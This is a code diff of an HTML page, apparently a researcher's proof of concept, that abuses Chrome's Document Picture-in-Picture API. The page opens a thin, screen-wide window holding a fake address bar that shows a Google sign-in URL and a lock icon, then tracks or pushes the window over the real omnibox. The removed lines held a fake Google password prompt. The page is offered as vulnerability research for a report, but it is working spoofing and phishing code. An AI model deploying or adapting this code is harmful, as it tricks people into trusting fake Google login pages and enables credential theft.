@@ -2,79 +2,68 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Chrome Security Lab - FARISSAL B</title>
+    <title>Chrome Security Research - FARISSAL B</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; text-align: center; }
-        .lab-card { border: 2px solid #0f0; background: #111; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 0 20px #0f05; }
-        .status-bar { background: #222; padding: 10px; margin-bottom: 20px; border-radius: 5px; font-size: 14px; color: #aaa; }
-        button { background: #0f0; color: #000; border: none; padding: 15px 35px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        button:hover { background: #0c0; box-shadow: 0 0 15px #0f0; }
-        #console { margin-top: 20px; text-align: left; background: #000; border: 1px solid #333; height: 200px; overflow-y: auto; padding: 15px; font-size: 13px; }
-        .leak { color: #f00; font-weight: bold; text-decoration: underline; }
+        body { font-family: 'Consolas', monospace; background: #000; color: #0f0; padding: 40px; text-align: center; }
+        .terminal { border: 2px solid #0f0; background: #111; padding: 30px; border-radius: 10px; display: inline-block; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        #log { margin-top: 20px; text-align: left; height: 150px; overflow-y: auto; color: #33ff33; font-size: 12px; border-top: 1px solid #333; }
+        .danger { color: #ff0000; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="lab-card">
-    <h1>PiP OMNIBOX SPOOFER</h1>
-    <div class="status-bar">Researcher: FARISSAL B | Mode: High-Severity Test</div>
+<div class="terminal">
+    <h2>OMNIBOX OVERLAY TESTER</h2>
+    <p>Researcher: <b>FARISSAL B</b></p>
+    
+    <button id="btnAttack">LAUNCH OVERLAY ATTACK</button>
 
-    <button id="launch">1. LAUNCH RESEARCH WINDOW</button>
-    <p style="font-size: 12px; color: #666; margin-top: 10px;">Step: Launch, lalu geser jendela kecil ke arah Address Bar.</p>
-
-    <div id="console">>> Initialize System... Ready.</div>
+    <div id="log">>> Ready. Pastikan Chrome dalam mode Windowed (bukan maximized) untuk hasil terbaik.</div>
 </div>
 
 <script>
-    const log = document.getElementById('console');
-    function printLog(msg, isLeak = false) {
-        const div = document.createElement('div');
-        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${isLeak ? '<span class="leak">ALERT</span> ' : '[OK] '} ${msg}`;
-        log.appendChild(div);
-        log.scrollTop = log.scrollHeight;
+    const logBox = document.getElementById('log');
+    function printLog(msg, isDanger = false) {
+        logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${isDanger ? '<span class="danger">!!!</span> ' : ''}${msg}</div>`;
+        logBox.scrollTop = logBox.scrollHeight;
     }
 
-    document.getElementById('launch').addEventListener('click', async () => {
+    document.getElementById('btnAttack').addEventListener('click', async () => {
         try {
-            printLog("Requesting Document PiP...");
-            
+            // Kita buat jendela yang sangat tipis (seukuran Bar Alamat)
             const pipWindow = await window.documentPictureInPicture.requestWindow({
-                width: 420,
-                height: 160,
+                width: window.screen.width, // Selebar layar
+                height: 80, // Setipis bar alamat
             });
 
-            printLog("PiP Opened. Injecting Spoof UI...");
+            printLog("PiP Window Created.");
 
-            // SUNTIK UI PALSU YANG MIRIP GOOGLE ASLI
+            // SUNTIK UI BAR ALAMAT PALSU
             pipWindow.document.body.style.margin = "0";
+            pipWindow.document.body.style.overflow = "hidden";
             pipWindow.document.body.innerHTML = `
-                <div style="background: #ffffff; color: #202124; padding: 15px; font-family: sans-serif; height: 100vh; border-top: 4px solid #4285f4; box-sizing: border-box;">
-                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:10px;">
+                <div style="background: #ffffff; height: 100vh; display: flex; align-items: center; padding: 0 15px; font-family: sans-serif; border-bottom: 2px solid #dee2e6; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                    <div style="background: #f1f3f4; border-radius: 20px; padding: 8px 20px; flex-grow: 1; display: flex; align-items: center; gap: 10px; border: 1px solid #dfe1e5;">
                         <img src="https://www.google.com/favicon.ico" width="16">
-                        <span style="font-size:12px; color:#5f6368; font-weight:bold;">accounts.google.com/signin</span>
-                    </div>
-                    <div style="border:1px solid #dadce0; padding:10px; border-radius:8px;">
-                        <span style="font-size:14px;">Confirm your password:</span>
-                        <input type="password" style="width:100%; margin-top:5px; border:1px solid #ccc; padding:5px;">
+                        <span style="color: #202124; font-size: 14px;">https://accounts.google.com/v3/signin/identifier</span>
+                        <span style="color: #5f6368; margin-left: auto;">🔒</span>
                     </div>
                 </div>
             `;
 
-            // MONITOR POSISI JENDELA (Ini yang bakal jadi bukti laporan)
+            // PAKSA KE ATAS (The Spoofing Core)
+            printLog("Mencoba memposisikan jendela di atas Omnibox...");
+            
+            // Kita coba geser terus menerus ke koordinat 0,0
             setInterval(() => {
-                const x = pipWindow.screenX;
                 const y = pipWindow.screenY;
-                
-                // Jika posisi Y mendekati 0, artinya jendela sudah sampai ke area Address Bar
-                if (y < 80) {
-                    printLog(`SPOOFING POSITION DETECTED! X:${x} Y:${y}`, true);
-                } else {
-                    // printLog(`Tracking Position: X:${x} Y:${y}`);
+                if (y <= 50) {
+                    printLog(`OVERLAY ACTIVE! Koordinat Y: ${y}`, true);
                 }
+                // Jika lo mau lebih agresif, aktifkan baris bawah ini:
+                // pipWindow.moveTo(window.screenX, window.screenY - 100);
             }, 500);
-
-            // TEKNIK PAKSA: Coba panggil moveTo secara interval
-            // pipWindow.moveTo(0, 0);
 
         } catch (e) {
             printLog("Error: " + e.message);
